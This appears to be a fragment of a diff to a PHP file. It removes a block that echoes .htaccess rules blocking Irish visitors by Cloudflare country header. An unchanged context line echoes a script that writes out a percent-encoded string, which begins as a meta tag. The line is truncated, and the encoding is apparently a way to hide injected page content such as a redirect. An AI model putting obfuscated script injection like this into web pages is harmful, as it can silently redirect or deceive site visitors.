@@ -5,13 +5,4 @@ echo "<script type='text/javascript'>document.write(unescape('%3C%6D%65%74%61%20
 
 ?>
 
-<?php
 
-// Genero: ProgramasProgramacion.com
-echo "# Bloqueo de paises\n";
-echo "SetEnvIf CF-IPCountry IE BuzzOff=1\n";
-echo "Order allow,deny\n";
-echo "Allow from all\n";
-echo "Deny from env=BuzzOff\n";
-
-?>
